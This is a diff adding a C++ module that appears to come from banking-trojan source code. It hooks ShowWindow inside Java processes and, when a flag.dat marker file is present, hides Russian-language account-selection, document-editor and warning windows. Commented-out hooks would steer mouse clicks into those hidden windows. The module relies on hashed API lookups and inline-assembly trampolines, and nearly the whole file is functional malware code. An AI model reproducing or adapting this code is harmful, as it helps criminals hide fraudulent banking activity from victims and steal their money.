@@ -1,0 +1,226 @@
+#include <windows.h>
+#include <windowsx.h>
+
+#include "GetApi.h"
+//#include "Utils.h"
+
+#include "Memory.h"
+#include "Strings.h"
+
+#include "BotUtils.h"
+#include "Rootkit.h"
+#include "Inject.h"
+//#include "Crypt.h"
+#include "Unhook.h"
+#include "Splice.h"
+
+
+#include "Java.h"
+
+//#include "ntdll.h"
+
+// Глобальные переменные для перехвата внутри Java-процесса
+// будем перехватывать только главный фрейм и одно диалоговое окно
+static LONG g_old_frame_wnd_proc  = 0;
+static LONG g_old_dialog_wnd_proc = 0;
+static HWND g_frame_wnd  = 0;
+static HWND g_dialog_wnd = 0;
+static bool g_is_dialog = false;
+
+// Волшебная константа - сколько итераций в перехваченной GetMessagePost должно
+// пройти, чтобы выполнился клик мышкой
+static const LONG MSG_POS_COUNT	= 10;
+
+// Для работы с координатами кликов мышки
+static int g_xPos = -1;
+static int g_yPos = -1;
+static int g_Count = 0;
+
+
+// Все функции которые мы будем хучить для Java
+typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
+static PShowWindow    Real_ShowWindow;
+
+typedef DWORD ( WINAPI *PGetMessagePos )( VOID );
+static PGetMessagePos    Real_GetMessagePos;
+
+typedef HWND  ( WINAPI *PWindowFromPoint )( POINT Point );
+static PWindowFromPoint    Real_WindowFromPoint;
+
+
+/************************************************************************/
+/* Координаты клика определяются Java через эту функцию, поэтому будем  */
+// возвращать в ней ранее запомненные координаты, пришедшие через 
+// WM_LBUTTONDOWN
+/*DWORD WINAPI Hook_GetMessagePos()
+{
+	POINT lpPoint;
+	lpPoint.x = g_xPos;
+	lpPoint.y = g_yPos;
+	DWORD res = 0;
+
+	if (g_Count > MSG_POS_COUNT)
+	{
+		// GetMessagePos слишком короткая, движок неверно хукает ее
+		// поэтому единственный способ вызвать оригинальную ф-ю - 
+		// анхукнуть её
+		UnhookGetMessagePos();
+	
+		// Вызываем оригинальную ф-ю 
+		res = (DWORD)pGetMessagePos();
+
+		// Возвращаем на место обработчик 
+		HookApi( 3, 0x9D2F45DB, (DWORD)&Hook_GetMessagePos);
+	}
+	else
+	{
+		g_Count++;
+
+		// Переводим координаты из клиентских в экранные
+		HWND csWnd = (g_is_dialog ? g_dialog_wnd : g_frame_wnd);
+		pClientToScreen(csWnd, &lpPoint);
+
+		// Вроде это не совсем правильная арифметика, см. MSDN по GetMessagePos
+		res = ((lpPoint.y<<16) + lpPoint.x);
+	}
+	// Возвращаем результат
+	return res;
+}*/
+
+/************************************************************************/
+// Перехватывам эту ф-ю для того, чтобы клики доходили даже в перекрытое 
+// и скрытое окно
+/*HWND WINAPI Hook_WindowFromPoint(POINT Point)
+{
+	//HANDLE hMutex = CreateMutex(NULL, FALSE, "WhiteJOE_USEJAVA");
+	if(GetLastError() == ERROR_ALREADY_EXISTS) // если яву нужно хучить
+	{
+		// Селектор - фрейм/диалог
+		HWND res = (g_is_dialog ? g_dialog_wnd : g_frame_wnd);
+
+		if (g_Count > MSG_POS_COUNT)
+		{
+			// Вызываем оригинальную функцию
+			res = Real_WindowFromPoint(Point);
+		}
+		return res;
+	}
+	else
+	{
+		return Real_WindowFromPoint(Point);
+	}
+}*/
+
+// Проверяет существование flag.dat файла
+bool JavacheckFileFlag()
+{
+	//return true;
+	CHAR* sAppData = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	pSHGetSpecialFolderPathA(NULL, sAppData, 0x001a, FALSE);
+	m_lstrcat(sAppData, "/flag.dat");
+	DWORD attr = (DWORD)pGetFileAttributesA(sAppData);
+	MemFree(sAppData);
+	if(attr == INVALID_FILE_ATTRIBUTES) return false;
+	else return true;
+}
+
+
+/************************************************************************/
+/* В момент показа окна на экране перехватываем его оконную функцию,    */
+// если она ещё не перехвачена. Если показывается диалог, то считаем его
+// модальным, все координаты кликов будут обрабатываться для него.
+static BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
+{
+	pOutputDebugStringA(JavacheckFileFlag()?"Flag = TRUE":"Flag = FALSE");
+	if(JavacheckFileFlag())
+	{
+		//pOutputDebugStringA("!!! JavacheckFileFlag() = TRUE");
+		WCHAR* windowCaption = (WCHAR*)MemAlloc(MAX_PATH * sizeof(WCHAR));
+		pGetWindowTextW(hWnd, windowCaption, MAX_PATH);
+		pOutputDebugStringW(windowCaption);
+		
+		if(plstrcmpW(windowCaption, L"Выбор счета") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"Выбор счета HIDE"); }
+		else if(plstrcmpW(windowCaption, L"Редактор документов") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"Редактор документов HIDE"); }
+		else if(plstrcmpW(windowCaption, L"Предупреждение") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"Предупреждение HIDE"); }
+		MemFree(windowCaption);
+	}
+
+	// Вызываем дефолтную ShowWindow
+	return Real_ShowWindow(hWnd, Cmd);
+}
+
+/************************************************************************/
+bool WINAPI IsJava()
+{
+	// Функция вернёт истину если она вызвана в процессе
+	// Java.exe или Javaw.exe
+	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
+
+	if ( ModulePath == NULL )
+	{
+		return false;
+	}
+
+	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
+	DWORD dwProcessHash = GetNameHash( ModulePath );
+
+	// Java или Javaw
+	if ( dwProcessHash == 0x150CFBD3 || dwProcessHash == 0x1F1AA76A )
+		{
+			pOutputDebugStringA("Java process has been found!");
+			MemFree( ModulePath );
+			return true;
+		}
+
+	MemFree( ModulePath );
+	return false;
+}
+
+
+/************************************************************************/
+bool HookJava()
+{
+	// функция вешает хуки на базовые функции которые использует
+	// Java для работы со своими окнами
+	// Работает только в случае вызова из процесса Java
+
+	if ( !IsJava() )
+	{
+		return false;
+	}
+
+	UnhookJava();
+
+	HookJavaApi();
+
+	return true;
+}
+
+/************************************************************************/
+bool HookJavaApi()
+{
+//	DbgMsg("HookJavaApi",0,"BEFORE");
+
+	if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
+	{  
+		__asm mov [Real_ShowWindow], eax			
+	}	
+
+	/*if ( HookApi( 3, 0x9D2F45DB, (DWORD)&Hook_GetMessagePos) )
+	{  
+		__asm mov [Real_GetMessagePos], eax			
+	}	
+
+	if ( HookApi( 3, 0x85F352BD, (DWORD)&Hook_WindowFromPoint) )
+	{  
+		__asm mov [Real_WindowFromPoint], eax			
+	}*/	
+
+	//DbgMsg("HookJavaApi",0,"AFTER");
+	
+	return true;
+}
+
+
+
+
